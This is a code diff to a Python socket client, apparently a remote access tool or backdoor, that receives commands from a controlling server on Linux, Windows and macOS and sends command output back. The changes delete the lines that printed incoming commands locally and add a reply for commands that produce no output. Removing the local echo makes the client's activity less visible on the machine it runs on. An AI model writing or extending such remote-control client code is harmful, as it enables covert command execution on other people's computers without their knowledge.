@@ -31,7 +31,6 @@ def receive_data(client):
     if os == 'Linux':
         while True and not stop_thread.is_set():
             data = client.recv(1024).decode('utf-8')
-            print(data)
             if data == 'os':
                 osfull = platform.system()
                 client.send(f"OS: {osfull}".encode('utf-8'))
@@ -88,7 +87,6 @@ def receive_data(client):
     elif os == 'Windows':
         while True and not stop_thread.is_set():
             data = client.recv(1024).decode('utf-8')
-            print(data)
             if data == 'os':
                 osfull = platform.system()
                 client.send(f"OS: {osfull}".encode('utf-8'))
@@ -132,6 +130,8 @@ def receive_data(client):
                         # Send the chunks
                         for chunk in output:
                             client.send(chunk)
+                    elif len(output) == 0:
+                        client.send('Command executed successfully'.encode('utf-8'))
                     else:
                         client.send(output)
                     # client.send('Command received successfully'.encode('utf-8'))
@@ -145,7 +145,6 @@ def receive_data(client):
     elif os == 'Darwin':
         while True and not stop_thread.is_set():
             data = client.recv(1024).decode('utf-8')
-            print(data)
             if data == 'os':
                 osfull = platform.system()
                 client.send(f"OS: {osfull}".encode('utf-8'))
@@ -189,6 +188,8 @@ def receive_data(client):
                         # Send the chunks
                         for chunk in output:
                             client.send(chunk)
+                    elif len(output) == 0:
+                        client.send('Command executed successfully'.encode('utf-8'))
                     else:
                         client.send(output)
                     # client.send('Command received successfully'.encode('utf-8'))
